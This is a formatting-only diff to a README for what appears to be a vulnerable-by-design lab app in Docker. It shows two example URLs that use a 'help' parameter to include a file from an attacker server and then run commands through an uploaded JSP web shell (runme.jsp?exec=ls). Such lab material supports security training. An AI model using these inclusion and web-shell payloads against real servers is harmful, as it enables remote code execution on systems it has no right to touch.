@@ -77,9 +77,8 @@ Upload runme.jsp for Remote Code Execution:
 
 (You have to adjust ip addresses to the attacker server in the docker network)
 
-[http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor](http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor)
-
-[http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/runme.jsp?exec=ls)
+- [http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor](http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor)
+- [http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/runme.jsp?exec=ls)
 
 ## ASP / Razor
 
